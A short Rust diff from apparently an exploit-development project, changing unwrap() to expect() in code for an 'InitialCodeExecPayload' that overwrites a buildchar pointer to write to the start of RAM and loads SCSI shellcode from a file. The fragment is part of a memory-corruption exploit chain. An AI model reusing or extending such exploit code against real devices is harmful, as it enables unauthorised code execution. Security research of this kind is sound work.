@@ -16,7 +16,7 @@ impl Payload for InitialCodeExecPayload {
         // Set our write target to start of ram
         b.index_write(Cfg::OFFSET_BUILDCHAR_PTR, Cfg::BUILDCHAR_OVERWRITE_ADDR);
 
-        let payload = std::fs::read("./scsi_shellcode/scsi-stub.bin").unwrap();
+        let payload = std::fs::read("./scsi_shellcode/scsi-stub.bin").expect("Failed to read './scsi_shellcode/scsi-stub.bin'");
 
         {
             let cs = Capstone::new()
